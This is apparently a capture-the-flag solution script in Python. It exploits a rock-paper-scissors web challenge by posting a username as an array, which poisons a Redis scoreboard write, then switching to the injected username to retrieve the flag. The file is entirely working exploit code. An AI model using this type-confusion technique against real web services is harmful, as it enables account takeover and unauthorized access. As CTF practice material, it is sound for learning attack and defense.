import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8081', 'https': 'http://127.0.0.1:8081'}

HOST = 'https://rock-paper-scissors-542923c2d8fab975.be.ax'
sess = requests.Session()

exfil_username = 'injected'
# Create username that's an array
r = sess.post(HOST + '/new', json={'username': ['hey', 1337, exfil_username]})

# Make sure we always lose, so we hit the `redis.zadd('scoreboard', score, username)`:
r = sess.post(HOST + '/play', json={'position': "a"})

# Now change user
r = sess.post(HOST + '/new', json={'username': exfil_username})

# Then we can get flag
flag = sess.get(HOST + '/flag').text
print(flag)